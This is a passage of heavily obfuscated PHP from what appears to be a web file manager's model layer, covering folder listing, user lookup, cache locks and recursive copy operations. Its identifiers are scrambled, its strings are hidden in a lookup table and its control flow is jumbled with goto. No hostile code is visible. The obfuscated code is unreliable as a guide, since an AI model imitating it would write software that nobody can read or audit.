áÇ‡í¶å[$A»Ä‹Ø¾İ“[468]] = $A»Ä‹Ø¾İ“[8] . LNG($A»Ä‹Ø¾İ“[471]) . $A»Ä‹Ø¾İ“[8] . ltrim($d‹…„×½«­, $A»Ä‹Ø¾İ“[8]); goto aš¹õ¾»ë¾; C†Ü’Š‘…: $A»Ä‹Ø¾İ“ =& $_SERVER[í™]; if (intval($b áÇ‡í¶å[$A»Ä‹Ø¾İ“[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($fÎïî†¡˜ˆ, $aõŠ§ßÎÔê) && $b áÇ‡í¶å[$A»Ä‹Ø¾İ“[369]] != $fÎïî†¡˜ˆ) { return; } goto A®ã¿®Ï; D‹•µ¦Õ¼£: } protected function _listAppendPathRoot(&$CÌ°‘¾ç¦£, $AÚöæ°ÏÌŞ) { $D‡¹¨£å¦å =& $_SERVER[í™]; $c©İ‰Åå„° = $D‡¹¨£å¦å[33]; if ($CÌ°‘¾ç¦£[$D‡¹¨£å¦å[371]] == self::TYPE_USER) { if (defined($D‡¹¨£å¦å[427]) && $CÌ°‘¾ç¦£[$D‡¹¨£å¦å[458]] == USER_ID) { $c©İ‰Åå„° = LNG($D‡¹¨£å¦å[475]); if (!$AÚöæ°ÏÌŞ) { $CÌ°‘¾ç¦£[$D‡¹¨£å¦å[28]] = $c©İ‰Åå„°; } } else { $D‚ß­Ò±šĞ = Model($D‡¹¨£å¦å[476])->getInfoSimple($CÌ°‘¾ç¦£[$D‡¹¨£å¦å[458]]); $c©İ‰Åå„° = LNG($D‡¹¨£å¦å[477]) . $D‡¹¨£å¦å[157] . $D‚ß­Ò±šĞ[$D‡¹¨£å¦å[28]] . $D‡¹¨£å¦å[478]; } } else { if ($CÌ°‘¾ç¦£[$D‡¹¨£å¦å[371]] == self::TYPE_GROUP) { $D‚ß­Ò±šĞ = Model($D‡¹¨£å¦å[460])->getInfoSimple($CÌ°‘¾ç¦£[$D‡¹¨£å¦å[458]]); $c©İ‰Åå„° = $D‚ß­Ò±šĞ[$D‡¹¨£å¦å[28]]; } else { if ($CÌ°‘¾ç¦£[$D‡¹¨£å¦å[371]] == self::TYPE_SYSTEM) { $D‚ß­Ò±šĞ = $this->sourceInfo($AÚöæ°ÏÌŞ[0], !0); $c©İ‰Åå„° = $D‚ß­Ò±šĞ[$D‡¹¨£å¦å[28]]; } } } $c©İ‰Åå„° = $c©İ‰Åå„° ? $D‡¹¨£å¦å[8] . $c©İ‰Åå„° . $D‡¹¨£å¦å[8] : $D‡¹¨£å¦å[8]; return $c©İ‰Åå„°; } protected function _listAppendUser(&$dê£›®Ğ) { $Cñˆ‹²¼˜ß =& $_SERVER[í™]; $EÂšİàÖÌÄ = array_to_keyvalue($dê£›®Ğ, $Cñˆ‹²¼˜ß[33], $Cñˆ‹²¼˜ß[378]); $d…Ñ‹—Ñ² = array_to_keyvalue($dê£›®Ğ, $Cñˆ‹²¼˜ß[33], $Cñˆ‹²¼˜ß[379]); $Bƒê‡˜ÇÅ = array_merge($EÂšİàÖÌÄ, $d…Ñ‹—Ñ²); $Eó®Õ¡Ò… = Model($Cñˆ‹²¼˜ß[479])->userListInfo($Bƒê‡˜ÇÅ); foreach ($dê£›®Ğ as &$A’Æ³äŠ§¢) { $fÄ ¨Æ–‹ = $A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[378]]; $A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[378]] = $Eó®Õ¡Ò…[$fÄ ¨Æ–‹] ? $Eó®Õ¡Ò…[$fÄ ¨Æ–‹] : !1; $fÄ ¨Æ–‹ = $A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[379]]; $A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[379]] = $Eó®Õ¡Ò…[$fÄ ¨Æ–‹] ? $Eó®Õ¡Ò…[$fÄ ¨Æ–‹] : !1; if (isset($A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[417]]) && $A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[417]][$Cñˆ‹²¼˜ß[480]]) { $b‚Ç‚¿…í = $GLOBALS[$Cñˆ‹²¼˜ß[6]][$Cñˆ‹²¼˜ß[84]][$Cñˆ‹²¼˜ß[481]]; if ($A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[417]][$Cñˆ‹²¼˜ß[482]] <= time() - $b‚Ç‚¿…í) { $this->metaSet($A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[369]], $Cñˆ‹²¼˜ß[480], null); $this->metaSet($A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[369]], $Cñˆ‹²¼˜ß[482], null); unset($A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[417]][$Cñˆ‹²¼˜ß[480]]); continue; } $Föõµ¾ùäê = $A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[417]][$Cñˆ‹²¼˜ß[480]]; $A’Æ³äŠ§¢[$Cñˆ‹²¼˜ß[417]][$Cñˆ‹²¼˜ß[483]] = Model($Cñˆ‹²¼˜ß[479])->getInfoSimpleOuter($Föõµ¾ùäê); } } } public function parentLevelArray($CÆ½åÜÀç) { $dÑ‘Äùó… =& $_SERVER[í™]; $CÆ½åÜÀç = explode($dÑ‘Äùó…[47], trim($CÆ½åÜÀç, $dÑ‘Äùó…[47])); return array_remove_value($CÆ½åÜÀç, $dÑ‘Äùó…[470]); } public function listAll($cÕí¥ÍØ§Í) { goto Dêîö–Ø¡Ğ; aè¯…îç•: $aÊ°´ÓÌ£ò = $C®ßÜ•¸îß[488]; $c½áëç¿° = "\114\x45\106\x54\x20\112\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\137\x66\151\x6c\145\x20\x66\x69\154\145\x20\157\156\x20\x73\157\x75\x72\143\x65\56\x66\x69\154\x65\x49\x44\40\x3d\x20\x66\151\154\145\56\x66\151\x6c\145\x49\x44"; $f…äÂôØìŒ = $this->alias($C®ßÜ•¸îß[489])->field($aÊ°´ÓÌ£ò)->where($f÷ØÁ½Ÿ‘)->join($c½áëç¿°)->select(); goto d³Â¡õĞÛã; d³Â¡õĞÛã: $this->_listAppendAuth($f…äÂôØìŒ); $this->_listAppendUser($f…äÂôØìŒ); $this->_listAppendPath($f…äÂôØìŒ); goto dÉ­¹®‡Ö; eÌ¡ÜÊªà: $a… ñ†Ø = array(); foreach ($f…äÂôØìŒ as $dç¯´™¼ˆ => $eø¯ˆ•ğ•») { goto dß“È›çæó; d¯ˆÎ‡ô‰Õ: if (!$eø¯ˆ•ğ•»[$C®ßÜ•¸îß[370]]) { $c—Û˜Óó[$C®ßÜ•¸îß[419]] = $eø¯ˆ•ğ•»[$C®ßÜ•¸îß[419]]; $c—Û˜Óó[$C®ßÜ•¸îß[491]] = $eø¯ˆ•ğ•»[$C®ßÜ•¸îß[75]]; } $a… ñ†Ø[] = $c—Û˜Óó; goto CêÖ¤¢·; DÑ²Ã¤­ï‚: $dÛ–¤¥‡÷á = str_replace($C®ßÜ•¸îß[469], $C®ßÜ•¸îß[8], $dÛ–¤¥‡÷á); $dÛ–¤¥‡÷á = str_replace($C®ßÜ•¸îß[469], $C®ßÜ•¸îß[8], $dÛ–¤¥‡÷á); $c—Û˜Óó = array($C®ßÜ•¸îß[387] => str_replace($C®ßÜ•¸îß[469], $C®ßÜ•¸îß[8], $dÛ–¤¥‡÷á), $C®ßÜ•¸îß[490] => intval($eø¯ˆ•ğ•»[$C®ßÜ•¸îß[370]]), $C®ßÜ•¸îß[391] => $this->pathInfoFilter($eø¯ˆ•ğ•», !0)); goto d¯ˆÎ‡ô‰Õ; Bê“‚ºªÄ: for ($B¶ÎÏªäîĞ = 0; $B¶ÎÏªäîĞ < count($Eë¶ï¨©ò); $B¶ÎÏªäîĞ++) { $dÛ–¤¥‡÷á .= $f…äÂôØìŒ[$Eë¶ï¨©ò[$B¶ÎÏªäîĞ]][$C®ßÜ•¸îß[28]] . $C®ßÜ•¸îß[8]; } $dÛ–¤¥‡÷á .= $eø¯ˆ•ğ•»[$C®ßÜ•¸îß[28]]; if ($eø¯ˆ•ğ•»[$C®ßÜ•¸îß[370]]) { $dÛ–¤¥‡÷á .= $C®ßÜ•¸îß[8]; } goto DÑ²Ã¤­ï‚; dß“È›çæó: $Eë¶ï¨©ò = $this->parentLevelArray($eø¯ˆ•ğ•»[$C®ßÜ•¸îß[461]]); array_shift($Eë¶ï¨©ò); $dÛ–¤¥‡÷á = $dÉ Ü¦É¡ä; goto Bê“‚ºªÄ; CêÖ¤¢·: } return $a… ñ†Ø; goto bÑÃÃİÉÈâ; dÉ­¹®‡Ö: $f…äÂôØìŒ = array_to_keyvalue($f…äÂôØìŒ, $C®ßÜ•¸îß[369]); $dÉ Ü¦É¡ä = "\x2f{$bª¦˜Ïòï[$C®ßÜ•¸îß[28]]}\x2f"; $dÉ Ü¦É¡ä = $dÉ Ü¦É¡ä == $C®ßÜ•¸îß[469] ? $C®ßÜ•¸îß[8] : $dÉ Ü¦É¡ä; goto eÌ¡ÜÊªà; Dêîö–Ø¡Ğ: $C®ßÜ•¸îß =& $_SERVER[í™]; $bª¦˜Ïòï = $this->sourceInfo($cÕí¥ÍØ§Í); $f÷ØÁ½Ÿ‘ = array($C®ßÜ•¸îß[484] => array($C®ßÜ•¸îß[485], $bª¦˜Ïòï[$C®ßÜ•¸îß[461]] . $cÕí¥ÍØ§Í . $C®ßÜ•¸îß[486]), $C®ßÜ•¸îß[487] => 0); goto aè¯…îç•; bÑÃÃİÉÈâ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($D» ÏÀ¾¾) { goto fÒ œéš; fÒ œéš: $e¢Ñíæ‹˜Ë =& $_SERVER[í™]; if (!$this->allowLock()) { return; } $this->_lockCheck($e¢Ñíæ‹˜Ë[492], $D» ÏÀ¾¾); goto fé¬ìÃ¾ §; BİÔÑñÖîİ: $this->_lockEvent($D» ÏÀ¾¾, array($e¢Ñíæ‹˜Ë[495], $e¢Ñíæ‹˜Ë[496]), $CÂ£œÒ…£é); $this->_lockCheckEnd($e¢Ñíæ‹˜Ë[492], $D» ÏÀ¾¾); goto D¿…“Õí; fé¬ìÃ¾ §: $CÂ£œÒ…£é = 1; $this->_lockEvent($D» ÏÀ¾¾, array($e¢Ñíæ‹˜Ë[493], $e¢Ñíæ‹˜Ë[494]), $CÂ£œÒ…£é); $this->_lockParent($D» ÏÀ¾¾, array($e¢Ñíæ‹˜Ë[494]), $CÂ£œÒ…£é); goto BİÔÑñÖîİ; D¿…“Õí: } public function lockCopyEnd($EÁĞ§ª‹Å) { $b“½Ù¸°— =& $_SERVER[í™]; if (!$this->allowLock()) { return; } $cï‡“ĞéÎ = 0; $this->_lockEvent($EÁĞ§ª‹Å, array($b“½Ù¸°—[493], $b“½Ù¸°—[494]), $cï‡“ĞéÎ); $this->_lockParent($EÁĞ§ª‹Å, array($b“½Ù¸°—[494]), $cï‡“ĞéÎ); $this->_lockEvent($EÁĞ§ª‹Å, array($b“½Ù¸°—[495], $b“½Ù¸°—[496]), $cï‡“ĞéÎ); } public function lockWriteStart($FçÕ¼ôÌ·, $F®—ïÒõÇ = '') { goto fÚŞá¢¬íõ; aî¾¤ÊŒî™: $this->_lockParent($FçÕ¼ôÌ·, array($e¿–¢À“–[492], $e¿–¢À“–[494]), $Eä¬ÅÂÂ à); $this->_lockCheckEnd($e¿–¢À“–[493], $FçÕ¼ôÌ·); goto e™–ĞÃÇÈ; fÚŞá¢¬íõ: $e¿–¢À“– =& $_SERVER[í™]; if (!$this->allowLock()) { return; } $this->_lockCheck($e¿–¢À“–[493], $FçÕ¼ôÌ·); goto A°¶å·³ƒ‰; A°¶å·³ƒ‰: $Eä¬ÅÂÂ à = 1; $this->_lockKey($e¿–¢À“–[497] . $FçÕ¼ôÌ· . $e¿–¢À“–[91] . $F®—ïÒõÇ, $Eä¬ÅÂÂ à); $this->_lockEvent($FçÕ¼ôÌ·, array($e¿–¢À“–[492], $e¿–¢À“–[494]), $Eä¬ÅÂÂ à); goto aî¾¤ÊŒî™; e™–ĞÃÇÈ: } public function lockWriteEnd($B»É×È„ğŞ, $eøÊ¾»á³Æ = '') { $f¿ˆöÅŠÁÅ =& $_SERVER[í™]; if (!$this->allowLock()) { return; } $fŠ½’£æ‰ = 0; $this->_lockKey($f¿ˆöÅŠÁÅ[497] . $B»É×È„ğŞ . $f¿ˆöÅŠÁÅ[91] . $eøÊ¾»á³Æ, $fŠ½’£æ‰); $this->_lockEvent($B»É×È„ğŞ, array($f¿ˆöÅŠÁÅ[492], $f¿ˆöÅŠÁÅ[494]), $fŠ½’£æ‰); $this->_lockParent($B»É×È„ğŞ, array($f¿ˆöÅŠÁÅ[492], $f¿ˆöÅŠÁÅ[494]), $fŠ½’£æ‰); } public function lockMoveStart($B À½ßŠó®) { goto e±Ú…‹Ğ¿Ñ; E³Ó¼Á™çŒ: $Eù¾¹—¬–· = 1; $this->_lockKey($AŠƒŒÅÅöÉ[498] . $B À½ßŠó®, $Eù¾¹—¬–·); $this->_lockEvent($B À½ßŠó®, array($AŠƒŒÅÅöÉ[492], $AŠƒŒÅÅöÉ[493]), $Eù¾¹—¬–·); goto FÌŒˆÙñ; FÌŒˆÙñ: $this->_lockParent($B À½ßŠó®, array($AŠƒŒÅÅöÉ[492], $AŠƒŒÅÅöÉ[494]), $Eù¾¹—¬–·); $this->_lockEvent($B À½ßŠó®, array($AŠƒŒÅÅöÉ[499], $AŠƒŒÅÅöÉ[495], $AŠƒŒÅÅöÉ[496]), $Eù¾¹—¬–·); $this->_lockCheckEnd($AŠƒŒÅÅöÉ[494], $B À½ßŠó®); goto DË¨¨ñã¾; e±Ú…‹Ğ¿Ñ: $AŠƒŒÅÅöÉ =& $_SERVER[í™]; if (!$this->allowLock()) { return; } $this->_lockCheck($AŠƒŒÅÅöÉ[494], $B À½ßŠó®); goto E³Ó¼Á™çŒ; DË¨¨ñã¾: } public function lockMoveEnd($f’“»ÙŞ“ ) { goto FœèìÌÖˆÆ; eÔïŞ£ŞãÒ: $this->_lockKey($D…ÍËœö·×[498] . $f’“»ÙŞ“ , $Bë‹ÜÒ§õŠ); $this->_lockEvent($f’“»ÙŞ“ , array($D…ÍËœö·×[492], $D…ÍËœö·×[493]), $Bë‹ÜÒ§õŠ); $this->_lockParent($f’“»ÙŞ“ , array($D…ÍËœö·×[492], $D…ÍËœö·×[494]), $Bë‹ÜÒ§õŠ); goto AÜ•œ·½; FœèìÌÖˆÆ: $D…ÍËœö·× =& $_SERVER[í™]; if (!$this->allowLock()) { return; } $Bë‹ÜÒ§õŠ = 0; goto eÔïŞ£ŞãÒ; AÜ•œ·½: $this->_lockEvent($f’“»ÙŞ“ , array($D…ÍËœö·×[499], $D…ÍËœö·×[495], $D…ÍËœö·×[496]), $Bë‹ÜÒ§õŠ); goto Bºˆ¦¤¸©; Bºˆ¦¤¸©: } private function _lockCheck($eêêªÎ¹, $Féø‹ŒƒõË) { goto Bº ìâÑ‡·; c¼ÉÉ¾ñóÖ: CacheLock::setErrorMsg($a¢‘à”‡ªÒ[157] . htmlspecialchars($fÜ¥Å‘Ì’Ë[$a¢‘à”‡ªÒ[28]]) . $a¢‘à”‡ªÒ[478] . $fâÛÖ÷¤æ); $this->_lockKey($B§„ÍçºÀÎ, 1); $this->_lockKey($B§„ÍçºÀÎ, 0); goto Bğô”õª¹·; DÎøÍ»…Ô×: $this->_lockTimeStart[$B§„ÍçºÀÎ] = timeFloat(); if (!is_array($fÜ¥Å‘Ì’Ë)) { return; } $fâÛÖ÷¤æ = LNG($a¢‘à”‡ªÒ[500]); goto c¼ÉÉ¾ñóÖ; Bº ìâÑ‡·: $a¢‘à”‡ªÒ =& $_SERVER[í™]; $fÜ¥Å‘Ì’Ë = $this->sourceInfo($Féø‹ŒƒõË); $B§„ÍçºÀÎ = $eêêªÎ¹ . $a¢‘à”‡ªÒ[91] . $Féø‹ŒƒõË; goto DÎøÍ»…Ô×; Bğô”õª¹·: $fø×ù‘Ô¢ = array_reverse($this->parentLevelArray($fÜ¥Å‘Ì’Ë[$a¢‘à”‡ªÒ[461]])); foreach ($fø×ù‘Ô¢ as $cù®†‹·Ã´) { $B§„ÍçºÀÎ = $eêêªÎ¹ . $a¢‘à”‡ªÒ[501] . $cù®†‹·Ã´; if (CacheLock::lockGet($a¢‘à”‡ªÒ[502] . $B§„ÍçºÀÎ)) { $fÜ¥Å‘Ì’Ë = $this->sourceInfo($cù®†‹·Ã´); CacheLock::setErrorMsg($a¢‘à”‡ªÒ[157] . htmlspecialchars($fÜ¥Å‘Ì’Ë[$a¢‘à”‡ªÒ[28]]) . $a¢‘à”‡ªÒ[478] . $fâÛÖ÷¤æ); $this->_lockKey($B§„ÍçºÀÎ, 1); $this->_lockKey($B§„ÍçºÀÎ, 0); } } goto FŠ³Ò÷æ¹à; FŠ³Ò÷æ¹à: } private function _lockCheckEnd($eÆà…£ˆ‹‹, $BŞÌ‘¸Ç») { goto fÓ¡¢Á®æÅ; a½Á „åÁ: if (!isset($this->_lockTimeStart[$DŠ¾Î¼Šˆ])) { return; } $E£ˆ‰ò— = timeFloat() - $this->_lockTimeStart[$DŠ¾Î¼Šˆ]; unset($this->_lockTimeStart[$DŠ¾Î¼Šˆ]); goto dñÉÎÅ‡‚Ñ; fÓ¡¢Á®æÅ: $b‘Ãùë²§ =& $_SERVER[í™]; $DŠ¾Î¼Šˆ = $eÆà…£ˆ‹‹ . $b‘Ãùë²§[91] . $BŞÌ‘¸Ç»; CacheLock::setErrorMsg($b‘Ãùë²§[361]); goto a½Á „åÁ; dñÉÎÅ‡‚Ñ: if ($E£ˆ‰ò— > 0.5) { unset(self::$cacheSourceInfo[$b‘Ãùë²§[410] . $BŞÌ‘¸Ç»]); } $eœãô¢òŒ = $this->sourceInfo($BŞÌ‘¸Ç»); if (!$eœãô¢òŒ) { show_json(LNG($b‘Ãùë²§[101]), !1); } goto dñˆˆÛ×; dñˆˆÛ×: } private function _lockParent($D—ÁµÅ»Ü, $d’Œœ«ó©÷, $Fï ­ÛÃéÌ) { if (!$this->autoLockSet) { return; } $fº›ã»Í·‰ = $this->sourceInfo($D—ÁµÅ»Ü); if (!is_array($fº›ã»Í·‰)) { return; } $b ÂˆÂÀ§­ = array_reverse($this->parentLevelArray($fº›ã»Í·‰[$_SERVER[í™][461]])); foreach ($b ÂˆÂÀ§­ as $câÑ“ô°¤É) { $this->_lockEvent($câÑ“ô°¤É, $d’Œœ«ó©÷, $Fï ­ÛÃéÌ); } } private function _lockEvent($EƒÎçŸø÷ó, $fº³îÜ‡ø¦, $DãÁäš“Ù‰) { $e»°†å£» =& $_SERVER[í™]; if (!$this->autoLockSet) { return; } foreach ($fº³îÜ‡ø¦ as $BİòÄÃìÎ‡) { $f’ÂË«áö = $BİòÄÃìÎ‡ . $e»°†å£»[91] . $EƒÎçŸø÷ó; if ($DãÁäš“Ù‰ && CacheLock::lockGet($e»°†å£»[502] . $f’ÂË«áö)) { continue; } $this->_lockKey($f’ÂË«áö, $DãÁäš“Ù‰); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($d¸Ûá·ÁàÀ, $Fò¬Õ­ëØ = 1) { $b—†®©øÁ‹ = $_SERVER[í™][502] . md5($d¸Ûá·ÁàÀ); if ($Fò¬Õ­ëØ) { if (isset(self::$_lockItemArr[$b—†®©øÁ‹])) { return; } self::$_lockItemArr[$b—†®©øÁ‹] = 1; CacheLock::lock($b—†®©øÁ‹, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$b—†®©øÁ‹])) { return; } unset(self::$_lockItemArr[$b—†®©øÁ‹]); CacheLock::unlock($b—†®©øÁ‹); } } public function isParentOf($b¼©™õ¬ç, $fßÈƒäÃÇß) { goto FôğåÚ–Œâ; cº•¸Å‹îõ: $F±È—Šì³ = $C†Ô¹˜„Ó[$aÓÕºĞÎÏŸ[461]] . $C†Ô¹˜„Ó[$aÓÕºĞÎÏŸ[369]] . $aÓÕºĞÎÏŸ[47]; $F‘ÈªÌë = $B±‰ñÈˆ´Æ[$aÓÕºĞÎÏŸ[461]] . $B±‰ñÈˆ´Æ[$aÓÕºĞÎÏŸ[369]] . $aÓÕºĞÎÏŸ[47]; $AøŠ»ßä“ = strpos($F‘ÈªÌë, $F±È—Šì³) === 0; goto DÔšª›œ•; FôğåÚ–Œâ: $aÓÕºĞÎÏŸ =& $_SERVER[í™]; $C†Ô¹˜„Ó = $this->sourceInfo($b¼©™õ¬ç); $B±‰ñÈˆ´Æ = $this->sourceInfo($fßÈƒäÃÇß); goto cº•¸Å‹îõ; DÔšª›œ•: return $AøŠ»ßä“; goto côŒä§Ü°; côŒä§Ü°: } private $targetIsDelete = 0; public function copy($bî©»ÍÂ™Î, $eÑ”Êñó¿, $aÅÙÄœ¯Í = REPEAT_REPLACE, $aÆ°º¹ã¾ = '') { goto e“ÓÙ¤õŒ¨; FÚ¬‰Î¡÷¬: $this->targetIsDelete = intval($A×‹ ñ¡Ô[$fÑ²¸ö”¿Í[397]]); $eïÉõÌã½ù = $this->fileNameExistCache($eÑ”Êñó¿, $A×‹ ñ¡Ô[$fÑ²¸ö”¿Í[28]]); $f‡®ãì£‘ = $this->_copy($bî©»ÍÂ™Î, $eÑ”Êñó¿, $aÅÙÄœ¯Í, $C÷ÄïÍ‹ã¸, !0, $aÆ°º¹ã¾); goto d³ÔÑãàéÕ; d³ÔÑãàéÕ: $this->_childrenListClear(); $this->lockCopyEnd($bî©»ÍÂ™Î); $this->lockWriteEnd($eÑ”Êñó¿, $fëÊàù²”); goto eÊœ¡Îˆ’À; eğÜ¨¸†ò·: $this->lockCopyStart($bî©»ÍÂ™Î); $this->lockWriteStart($eÑ”Êñó¿, $fëÊàù²”); $C÷ÄïÍ‹ã¸ = array($fÑ²¸ö”¿Í[503] => array(), $fÑ²¸ö”¿Í[504] => array(), $fÑ²¸ö”¿Í[505] => array()); goto FÚ¬‰Î¡÷¬; fĞ„‰ÅÇ”Ã: $this->saveAll($C÷ÄïÍ‹ã¸[$fÑ²¸ö”¿Í[505]]); Model($fÑ²¸ö”¿Í[167])->linkAdd($C÷ÄïÍ‹ã¸[$fÑ²¸ö”¿Í[503]]); $this->folderSizeReset($eÑ”Êñó¿); goto eµÅŒÍ†Àš; eÊœ¡Îˆ’À: if ($A×‹ ñ¡Ô[$fÑ²¸ö”¿Í[370]] == $fÑ²¸ö”¿Í[83] && $eïÉõÌã½ù == $f‡®ãì£‘) { $this->folderSizeResetChildren($eïÉõÌã½ù); } Model($fÑ²¸ö”¿Í[506])->addAll($C÷ÄïÍ‹ã¸[$fÑ²¸ö”¿Í[504]], array(), !0); if ($eïÉõÌã½ù != $f‡®ãì£‘ || $A×‹ ñ¡Ô[$fÑ²¸ö”¿Í[370]] == $fÑ²¸ö”¿Í[83]) { Model($fÑ²¸ö”¿Í[507])->eventCopy($f‡®ãì£‘); } goto fĞ„‰ÅÇ”Ã; e“ÓÙ¤õŒ¨: $fÑ²¸ö”¿Í =& $_SERVER[í™]; $A×‹ ñ¡Ô = $this->sourceInfo($bî©»ÍÂ™Î); $f³Ö‹±Ï¤¹ = $this->sourceInfo($eÑ”Êñó¿); goto f²Üöéšïù; f²Üöéšïù: if (!$A×‹ ñ¡Ô || !$f³Ö‹±Ï¤¹ || $f³Ö‹±Ï¤¹[$fÑ²¸ö”¿Í[370]] != $fÑ²¸ö”¿Í[83]) { return !1; } if ($this->isParentOf($bî©»ÍÂ™Î, $eÑ”Êñó¿)) { return !1; } $fëÊàù²” = $aÆ°º¹ã¾ ? $aÆ°º¹ã¾ : $A×‹ ñ¡Ô[$fÑ²¸ö”¿Í[28]]; goto eğÜ¨¸†ò·; eµÅŒÍ†Àš: $this->updateModifyTime($eÑ”Êñó¿); return $f‡®ãì£‘; goto AÛ·³‘Çò; AÛ·³‘Çò: } private function _copy($Fš†Úç±«, $a„±À¡½è, $cøîÙë†Ãå, &$f˜ïòùäÄ†, $A³°ËÛ­Ää, $a¥É˜†²½ = '') { goto F²©Š†‚Î; dˆî‰¸Û»Â: return $bŞ¾Ã”¶¾Ì; goto b“Ô¨ğİîÁ; B‡Ğ«›ÀÈ: if (!$aÂ¿¶‹„”) { return $this->_copyCreate($Fš†Úç±«, $a„±À¡½è, $FòÇ›¡º•¸, $f˜ïòùäÄ†); } $bŞ¾Ã”¶¾Ì = $aÂ¿¶‹„”; if ($cÆÔÊŒÉŒµ) { if ($cøîÙë†Ãå == REPEAT_RENAME_FOLDER) { $FòÇ›¡º•¸ = $this->fileNameAutoCache($a„±À¡½è, $FòÇ›¡º•¸, $cøîÙë†Ãå, $cÆÔÊŒÉŒµ); $bŞ¾Ã”¶¾Ì = $this->_copyCreate($Fš†Úç±«, $a„±À¡½è, $FòÇ›¡º•¸, $f˜ïòùäÄ†); } else { $D¤ÕãÃµµ = $this->_childrenList($Fš†Úç±«); foreach ($D¤ÕãÃµµ as $EíäÑÁ…) { $this->_copy($EíäÑÁ…[$e©¸âÈäœÛ[369]], $aÂ¿¶‹„”, $cøîÙë†Ãå, $f˜ïòùäÄ†, !1); } } } else { if ($cøîÙë†Ãå == REPEAT_RENAME || $cøîÙë†Ãå == REPEAT_RENAME_FOLDER) { $FòÇ›¡º•¸ = $this->fileNameAutoCache($a„±À¡½è, $FòÇ›¡º•¸, $cøîÙë†Ãå, $cÆÔÊŒÉŒµ); $bŞ¾Ã”¶¾Ì = $this->_copyCreate($Fš†Úç±«, $a„±À¡½è, $FòÇ›¡º•¸, $f˜ïòùäÄ†); } else { if ($cøîÙë†Ãå == REPEAT_REPLACE) { $BÌÎ‹ù£¶„ = $this->sourceInfoCache($aÂ¿¶‹„”); $cª’Ö‡Œî = $this->fileHistory($BÌÎ‹ù£¶„, $aˆ‹ëã«Í‘[$e©¸âÈäœÛ[419]], $aˆ‹ëã«Í‘[$e©¸âÈäœÛ[77]]); if ($cª’Ö‡Œî) { $f˜ïòùäÄ†[$e©¸âÈäœÛ[503]][] = $aˆ‹ëã«Í‘[$e©¸âÈäœÛ[419]]; } } else { if ($cøîÙë†Ãå == REPEAT_SKIP) { } } } Hook::trigger($e©¸âÈäœÛ[508], array($e©¸âÈäœÛ[509], $aˆ‹ëã«Í‘, 0)); } goto dˆî‰¸Û»Â; A’¶œÜ„ó: $FòÇ›¡º•¸ = $a¥É˜†²½ ? $a¥É˜†²½ : $aˆ‹ëã«Í‘[$e©¸âÈäœÛ[28]]; $aÂ¿¶‹„” = $this->fileNameExistCache($a„±À¡½è, $FòÇ›¡º•¸); if ($A³°ËÛ­Ää) { $this->_childrenAllMake($Fš†Úç±«); if ($cÆÔÊŒÉŒµ && $aÂ¿¶‹„”) { $this->_childrenAllMake($aÂ¿¶‹„”); } } goto B‡Ğ«›ÀÈ; F²©Š†‚Î: $e©¸âÈäœÛ =& $_SERVER[í™]; $aˆ‹ëã«Í‘ = $this->sourceInfoCache($Fš†Úç±«); $cÆÔÊŒÉŒµ = $aˆ‹ëã«Í‘[$e©¸âÈäœÛ[370]] == $e©¸âÈäœÛ[83]; goto A’¶œÜ„ó; b“Ô¨ğİîÁ: } private function _copyCreate($e±™­îØ‚š, $f‚‰ëÏÅ•, $a»Ø¨Îæƒ½, &$Eù½ÁÎø…°) { goto EˆÜŒİ¯‚¶; eÎºŸ®¯İŸ: $C¦ë²ƒšÄ[$e±™­îØ‚š] = $aÊš’Â¨¬; $AŒ™µ½Ó§¸ = array(); $aİîàÂº’ì = array(); goto eìî¯‰Ö›»; DÎÌŞ¢…: $B‡ö¹‹º• = $this->sourceInfo($aÊš’Â¨¬); foreach ($e‘„¯²Ã¤æ as $eŞ‘©à¾ñ÷) { $fç”Õ¶²êé = $this->_makeItemData($eŞ‘©à¾ñ÷, $B‡ö¹‹º•, $eŞ‘©à¾ñ÷[$b…Ÿ¦‡³³[28]]); $fç”Õ¶²êé[$b…Ÿ¦‡³³[461]] = $eŞ‘©à¾ñ÷[$b…Ÿ¦‡³³[461]]; $Bˆ×²È¹¡ó[] = $fç”Õ¶²êé; } $this->chunkEventSet($b…Ÿ¦‡³³[513], array($b…Ÿ¦‡³³[514], $E¯äïÏì, $FÒ¤Ğ©Ç)); goto eøÁõ¡’; Aèˆ¬Ì´óù: $this->_childrenListAll($e±™­îØ‚š, $e‘„¯²Ã¤æ); $FÒ¤Ğ©Ç = count($e‘„¯²Ã¤æ); if ($FÒ¤Ğ©Ç == 0) { return $aÊš’Â¨¬; } goto DÎÌŞ¢…; A¬Ò´óøñÕ: $this->chunkEventSet($b…Ÿ¦‡³³[517], array($b…Ÿ¦‡³³[518], $E¯äïÏì, $FÒ¤Ğ©Ç)); $this->saveAll($aİîàÂº’ì); return $aÊš’Â¨¬; goto cãÚöš’½§; EˆÜŒİ¯‚¶: $b…Ÿ¦‡³³ =& $_SERVER[í™]; $B‘ÂŸÙÌ×§ = $this->sourceInfoCache($e±™­îØ‚š); $CÎĞ¥¨…ë… = $this->sourceInfoCache($f‚‰ëÏÅ•); goto Aßˆƒ…Ô‰î; eìî¯‰Ö›»: foreach ($BëŒİìÔ ³ as $eŞ‘©à¾ñ÷) { $aßªÛ‚ÖË¶ = $eŞ‘©à¾ñ÷[$b…Ÿ¦‡³³[369]]; $cäÌÃ¤˜Ø = $this->_childrenMatch($C¦ë²ƒšÄ, $eŞ‘©à¾ñ÷, $B‡ö¹‹º•); $AŒ™µ½Ó§¸[] = array($b…Ÿ¦‡³³[369], $aßªÛ‚ÖË¶, $b…Ÿ¦‡³³[463], $cäÌÃ¤˜Ø[$b…Ÿ¦‡³³[463]]); $aİîàÂº’ì[] = array($b…Ÿ¦‡³³[369], 